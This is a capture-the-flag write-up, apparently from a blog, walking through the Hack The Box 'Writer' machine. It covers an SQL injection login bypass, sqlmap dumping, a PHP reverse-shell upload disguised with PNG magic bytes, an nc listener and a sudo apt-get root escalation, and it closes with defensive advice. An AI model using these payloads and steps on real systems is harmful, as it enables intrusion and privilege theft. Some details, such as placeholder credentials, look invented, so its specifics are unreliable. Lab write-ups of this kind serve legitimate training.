---
title: "Hack The Box: Writer Machine Writeup"
date: 2024-10-20
draft: false
author: "Your Name"
tags: ["ctf", "hack the box", "writeup", "penetration testing"]
categories: ["CTF", "Offensive Security"]
image: /images/blogs/htb-writer.png
description: "Complete walkthrough of HTB Writer machine featuring SQL injection, file upload bypass, and privilege escalation"
---

Writer is a medium-difficulty Linux machine on Hack The Box that teaches valuable lessons about SQL injection, authentication bypass, and Linux privilege escalation.

## Machine Information

- **Name**: Writer
- **OS**: Linux
- **Difficulty**: Medium
- **Points**: 30
- **Release Date**: July 31, 2021

## Reconnaissance

### Nmap Scan

```bash
nmap -sC -sV -oA writer 10.10.11.101
```

**Results:**
```
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp  open  http    Apache httpd 2.4.41
139/tcp open  netbios-ssb Samba smbd 4.6.2
445/tcp open  netbios-ssb Samba smbd 4.6.2
```

### Web Enumeration

Visiting the website reveals a blog platform with authentication.

```bash
gobuster dir -u http://10.10.11.101 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Key findings:
- `/administrative` - Admin login panel
- `/static` - Static resources
- `/about` - About page

## Initial Foothold

### SQL Injection

Testing the login form at `/administrative` reveals SQL injection vulnerability:

**Payload:**
```
Username: admin' OR '1'='1'-- -
Password: anything
```

This bypasses authentication, but we need to extract actual credentials for a proper shell.

### SQLMap Exploitation

```bash
sqlmap -r login.req --batch --dump --level=5 --risk=3
```

**Discovered credentials:**
```
admin:password123hash
```

### File Upload Bypass

After logging in, we can upload images. Testing reveals:
1. File extension filtering
2. Content-type validation
3. No server-side validation of actual file content!

**Payload creation:**
```bash
# Create PHP reverse shell
cp /usr/share/webshells/php/php-reverse-shell.php shell.php
# Change magic bytes to appear as PNG
printf '\x89\x50\x4E\x47' | cat - shell.php > shell.php.png
```

Upload the file and trigger it by visiting the upload path.

### Reverse Shell

```bash
# Listener
nc -lvnp 4444

# Trigger
curl http://10.10.11.101/uploads/shell.php.png
```

Got shell as `www-data`!

## Privilege Escalation

### User Enumeration

```bash
cat /etc/passwd | grep bash
```

Found user: `kyle`

### Finding Credentials

Searching for configuration files:
```bash
find / -name "*.conf" 2>/dev/null | grep -v proc
```

Discovered database credentials in `/var/www/writer.htb/writer.conf`:
```
DB_USER=kyle
DB_PASS=KyleSecretPassword!
```

### SSH as Kyle

```bash
ssh kyle@10.10.11.101
# Password: KyleSecretPassword!
```

**User flag captured!** 🚩

## Root Privilege Escalation

### Sudo Permissions

```bash
sudo -l
```

Output:
```
User kyle may run the following commands on writer:
    (root) NOPASSWD: /usr/bin/apt-get
```

### GTFOBins Exploitation

Checking [GTFOBins](https://gtfobins.github.io/gtfobins/apt-get/) for apt-get:

```bash
sudo apt-get changelog apt
!/bin/bash
```

This spawns a root shell!

**Root flag captured!** 🚩

## Key Lessons Learned

1. **SQL Injection remains prevalent**: Always test authentication forms
2. **File upload validation**: Client-side validation is insufficient
3. **Password reuse**: Database credentials were reused for SSH
4. **Sudo misconfigurations**: Always check sudo permissions with `sudo -l`
5. **GTFOBins is your friend**: Know your privilege escalation vectors

## Defensive Recommendations

For blue teamers, this machine highlights several defensive measures:

1. **Use prepared statements** for all database queries
2. **Validate file uploads** on the server-side, check magic bytes
3. **Implement least privilege**: Web user shouldn't have database admin rights
4. **Avoid password reuse**: Use unique credentials for each service
5. **Audit sudo permissions**: Follow principle of least privilege

## Tools Used

- `nmap` - Port scanning
- `gobuster` - Directory enumeration
- `sqlmap` - SQL injection exploitation
- `Burp Suite` - Request manipulation
- `nc` - Reverse shell listener

## Timeline

- 00:00 - Initial recon and port scanning
- 00:15 - Discovered SQL injection in login
- 00:45 - Extracted credentials with sqlmap
- 01:00 - Found file upload bypass
- 01:30 - Got initial shell as www-data
- 02:00 - Privilege escalation to kyle
- 02:30 - Root privilege escalation via apt-get

**Total time:** 2.5 hours

---

*Have questions about the walkthrough? Find me on [Twitter](https://twitter.com/yourusername) or [LinkedIn](https://linkedin.com/in/yourprofile).*

**Tags for easy finding:** #HackTheBox #CTF #Writeup #PenetrationTesting #PrivilegeEscalation
